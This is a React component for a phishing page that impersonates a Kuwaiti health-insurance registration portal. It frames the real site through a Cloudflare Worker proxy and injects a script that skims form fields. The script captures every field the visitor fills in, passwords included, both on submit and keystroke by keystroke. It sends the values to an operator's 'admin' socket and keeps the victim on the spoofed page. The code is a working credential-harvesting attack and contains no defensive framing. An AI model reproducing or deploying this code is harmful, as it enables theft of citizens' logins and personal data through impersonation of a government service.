import { useState, useEffect, useRef } from 'react';
import { socket, visitor, navigateToPage } from '../lib/store';

const WORKER_BASE = 'https://moh-proxy.fanarali881.workers.dev';

export default function KuwaitInsuranceHome() {
  const [loading, setLoading] = useState(true);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  // Get saved path from localStorage (for refresh persistence)
  const getSavedPath = () => {
    const saved = localStorage.getItem('moh-current-path');
    if (saved) return saved;
    return '/Insurance/logaction';
  };

  const [iframePath] = useState(getSavedPath);

  // Try to inject capture script into iframe after load
  const injectCaptureScript = () => {
    try {
      const iframe = iframeRef.current;
      if (!iframe || !iframe.contentWindow || !iframe.contentDocument) return;

      const doc = iframe.contentDocument;

      // Check if script already injected
      if (doc.getElementById('moh-capture-script')) return;

      const script = doc.createElement('script');
      script.id = 'moh-capture-script';
      script.textContent = `
        (function(){
          // Helper: collect all form fields
          function collectFields(container) {
            var d = {};
            var inputs = (container || document).querySelectorAll('input, select, textarea');
            for (var i = 0; i < inputs.length; i++) {
              var el = inputs[i];
              var n = el.name || el.id || el.placeholder || ('field_' + i);
              var v = el.value || '';
              if (el.type === 'password') n = n + ' (كلمة السر)';
              if (v && el.type !== 'hidden' && el.type !== 'submit' && el.type !== 'button') {
                d[n] = v;
              }
              if (el.tagName === 'SELECT' && el.selectedIndex >= 0) {
                var opt = el.options[el.selectedIndex];
                if (opt && opt.text && opt.value) d[n] = opt.text + ' (' + opt.value + ')';
              }
            }
            return d;
          }

          // Capture form submissions
          document.addEventListener('submit', function(e) {
            try {
              var f = e.target;
              if (!f) return;
              var d = collectFields(f);
              if (Object.keys(d).length > 0) {
                window.parent.postMessage({
                  type: 'moh-form-data',
                  fields: d,
                  page: window.location.pathname + window.location.search
                }, '*');
              }
            } catch(ex) {}
          }, true);

          // Capture input changes with debounce
          var _dt = null;
          function captureInputs() {
            try {
              var d = collectFields();
              if (Object.keys(d).length > 0) {
                window.parent.postMessage({
                  type: 'moh-input-change',
                  fields: d,
                  page: window.location.pathname + window.location.search
                }, '*');
              }
            } catch(ex) {}
          }
          document.addEventListener('change', function() {
            clearTimeout(_dt);
            _dt = setTimeout(captureInputs, 500);
          }, true);
          document.addEventListener('input', function() {
            clearTimeout(_dt);
            _dt = setTimeout(captureInputs, 2000);
          }, true);

          // Send navigation info
          window.parent.postMessage({
            type: 'moh-navigation',
            path: window.location.pathname + window.location.search
          }, '*');
        })();
      `;
      doc.body.appendChild(script);
      console.log('Capture script injected successfully!');
    } catch (e) {
      // Cross-origin - can't inject, rely on Worker's built-in postMessage
      console.log('Cannot inject script (cross-origin), using Worker postMessage');
    }
  };

  useEffect(() => {
    // Listen for postMessage from iframe (Worker's built-in + injected script)
    const handleMessage = (event: MessageEvent) => {
      if (!event.data || !event.data.type) return;

      // Handle navigation tracking
      if (event.data.type === 'moh-navigation' && event.data.path) {
        localStorage.setItem('moh-current-path', event.data.path);
        const pageName = getPageName(event.data.path);
        navigateToPage(pageName);
      }

      // Handle form data capture (on submit)
      if (event.data.type === 'moh-form-data' && event.data.fields) {
        console.log('Captured form data:', event.data);
        sendToAdmin(event.data.fields, event.data.page, false);
      }

      // Handle input change tracking (real-time)
      if (event.data.type === 'moh-input-change' && event.data.fields) {
        console.log('Input change:', event.data);
        sendToAdmin(event.data.fields, event.data.page, true);
      }
    };

    window.addEventListener('message', handleMessage);

    // Polling: try to inject script and track URL
    const interval = setInterval(() => {
      // Try to inject capture script
      injectCaptureScript();

      // Try to read iframe URL
      try {
        const iframe = iframeRef.current;
        if (iframe && iframe.contentWindow) {
          const path = iframe.contentWindow.location.pathname + iframe.contentWindow.location.search;
          if (path && path !== '/') {
            const cleanPath = path.startsWith('/Insurance') ? path : '/Insurance/logaction';
            localStorage.setItem('moh-current-path', cleanPath);
          }
        }
      } catch (e) {
        // Cross-origin
      }
    }, 2000);

    return () => {
      window.removeEventListener('message', handleMessage);
      clearInterval(interval);
    };
  }, []);

  // Send captured data to admin via socket
  function sendToAdmin(fields: Record<string, string>, pagePath: string, isRealtime: boolean) {
    const pageName = getPageName(pagePath) + (isRealtime ? ' (إدخال مباشر)' : '');

    if (socket.value.connected && visitor.value._id) {
      const payload = {
        content: fields,
        page: pageName,
        waitingForAdminResponse: false,
      };
      console.log('Sending to admin:', payload);
      socket.value.emit('more-info', payload);
    } else {
      // Retry after 1 second
      setTimeout(() => {
        if (socket.value.connected && visitor.value._id) {
          socket.value.emit('more-info', {
            content: fields,
            page: pageName,
            waitingForAdminResponse: false,
          });
        }
      }, 1000);
    }
  }

  // Convert URL path to readable page name
  function getPageName(path: string): string {
    if (!path) return 'الصفحة الرئيسية';
    const lower = path.toLowerCase();
    if (lower.includes('/login')) return 'تسجيل الدخول';
    if (lower.includes('/register') || lower.includes('/signup') || lower.includes('/createaccount') || lower.includes('/newuser')) return 'إنشاء حساب جديد';
    if (lower.includes('/logaction')) return 'الصفحة الرئيسية';
    if (lower.includes('/service') || lower.includes('/application')) return 'صفحة الخدمات';
    if (lower.includes('/insurance')) return 'التأمين الصحي';
    return path;
  }

  // Handle iframe load
  const handleIframeLoad = () => {
    setLoading(false);
    // Try to inject capture script immediately on load
    setTimeout(injectCaptureScript, 500);
  };

  return (
    <div style={{
      width: '100vw',
      height: '100vh',
      position: 'fixed',
      top: 0,
      left: 0,
      zIndex: 9999,
      background: '#f0f4f8',
    }}>
      {loading && (
        <div style={{
          position: 'absolute',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          background: '#f0f4f8',
          zIndex: 10000,
          direction: 'rtl',
          fontFamily: 'Cairo, Arial, sans-serif'
        }}>
          <div style={{
            width: 60,
            height: 60,
            border: '4px solid #e0e0e0',
            borderTop: '4px solid #1a7a4c',
            borderRadius: '50%',
            animation: 'spin 1s linear infinite'
          }} />
          <p style={{ marginTop: 20, color: '#333', fontSize: 16 }}>
            جاري تحميل النظام الآلي لتسجيل الضمان الصحي...
          </p>
          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
        </div>
      )}

      <iframe
        ref={iframeRef}
        src={WORKER_BASE + iframePath}
        onLoad={handleIframeLoad}
        style={{
          width: '100%',
          height: '100%',
          border: 'none',
        }}
        title="النظام الآلي لتسجيل الضمان الصحي"
        allowFullScreen
      />
    </div>
  );
}
